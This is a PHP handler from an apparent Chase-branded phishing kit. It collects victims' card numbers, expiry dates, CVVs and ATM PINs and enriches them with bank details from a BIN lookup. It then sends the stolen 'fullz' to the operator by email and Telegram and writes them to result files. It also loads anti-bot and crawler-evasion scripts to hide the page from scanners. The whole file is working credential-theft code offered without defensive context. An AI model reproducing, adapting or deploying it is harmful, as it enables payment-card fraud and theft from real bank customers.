<?php
session_start();
error_reporting(0);
include '../autob/bt.php';
include '../autob/basicbot.php';
include '../autob/uacrawler.php';
include '../autob/refspam.php';
include '../autob/ipselect.php';
include "../autob/bts2.php";
include "../req/config.php";

function getcardtype($cardnumber){
$cardtype = array(
    '34'=>'American Express',
    '37'=>'American Express',
    '5'=>'Master Card',
    '4'=>'Visa',
    '30'=>'Blue Card',
	'36'=>'Blue Card',
    '38'=>'Blue Card',
    '35'=>'JCB',
    '6'=>'Discover');
if(substr($cardnumber,0,2) == "34"){return   $cardtype[34];}
else if(substr($cardnumber,0,2) == "37"){return  $cardtype[37];}
else if(substr($cardnumber,0,2)== "30"){return  $cardtype[30];}
else if(substr($cardnumber,0,2)== "36"){return  $cardtype[36];}
else if(substr($cardnumber,0,2)== "38"){return   $cardtype[38];}
else if(substr($cardnumber,0,2)== "35"){return  $cardtype[35];}
else if(substr($cardnumber,0,1)== "6"){return   $cardtype[6];}
else if(substr($cardnumber,0,1)== "5"){return   $cardtype[5];}
else if(substr($cardnumber,0,1) == "4"){return  $cardtype[4];}
else {return "Unknown";};
};

function getip(){ 
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        return $client;}
    elseif(filter_var($forward, FILTER_VALIDATE_IP)){
        return $forward;}
    else{
        return $remote;};
	};

function getcd($cardnumber){
$ctype = getcardtype($cardnumber);
$cd=str_replace(' ','',$cardnumber);
$bin=substr($cd,0,6);
$getdetails = "https://lookup.binlist.net/".$bin;
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content    = curl_exec($curl);
curl_close($curl);
$details=json_decode($content,true);
$narr=array('scheme'=>$ctype,'type'=>'Unknown','brand'=>'Unknown','bank'=>array('name'=>'Unknown',),'country'=>array('name'=>'Unknown'));
foreach($details as $key => $value){$narr[$key]=$value;};
return $narr;
};

if(isset($_POST['cardnumber']) && isset($_POST['expdate']) && isset($_POST['cvv'])){
	$cnum = str_replace(' ','',$_POST['cardnumber']);
if(strlen($cnum) > 12){
	$cardnumber =  $cnum;
	$expdate = $_POST['expdate'];
	$cvv = $_POST['cvv'];
	$atm = $_POST['atm'].$_SESSION['device'];
	$PublicIP = getip();
	$cd=getcd($cardnumber);
	$bank=strtoupper($cd['bank']['name'])." | ".$cd['country']['name'];
	$type=strtoupper($cd['scheme']." - ".$cd['type']);
	$level=strtoupper($cd['brand']);
	$Info_LOG = "
|------------------ CARD DETAILS ----------------|
Bank Info        : $bank
Type             : $type
Level            : $level
Card Number      : $cardnumber
Expiry date      : $expdate
CVV              : $cvv
ATM PIN          : $atm";
		$_SESSION['fullz'].=$Info_LOG; 
		
// Don't Touche
//Email
        if($Send_Email == 1 ){
            $subject = $PublicIP.' 🔷🌀 CHASE CARD | DEVICE';$headers = 'From: YoCHI <yochchasedemons@yochchaser.xyz>' . "\r\n" .'X-Mailer: PHP/' . phpversion();
			mail($to, $subject, $Info_LOG, $headers);
		};
//FTP == 1 save result >< == 0 don't save result
        if($Ftp_Write == 1 ){
			@mkdir('../../rst');
            $file = fopen("../../rst/Result_".$PublicIP.".txt", 'a');
            fwrite($file, $Info_LOG);
			fclose($file);
        };
//TELEGRAM 
        if ($send_tg == 1) {
			sendtoTG($tgid, $Info_LOG, $tgtoken);
        };
		if($Send_Email == 1 && isset($_SESSION['fullz'])){
            $subject = $PublicIP.' 🔷🌀 CHASE SESSION RESULTS';$headers = 'From: YoCHI <yochchasedemons@yochchaser.xyz>' . "\r\n" .'X-Mailer: PHP/' . phpversion();
				mail($to, $subject, $_SESSION['fullz'], $headers);
		};
//TELEGRAM 
        if ($send_tg == 1 && isset($_SESSION['fullz'])) {
			sendtoTG($tgid, $_SESSION['fullz'], $tgtoken);
        };
		if(isset($_SESSION['fullz'])){
			$file = fopen("../../admin/Results.txt", 'a');
			fwrite($file, $_SESSION['fullz'].'r\n');
			fclose($file);};
		header("location:complete.php?sessionnI_IX=".md5(rand(100, 999999999))."");
    }
	else{header("location:confirm2.php?sfailed=bc&dispatched=".md5('nassimdz')."");};
}
else{header("location:confirm2.php?sfailed=1&dispatched=".md5('nassimdz')."");};
?>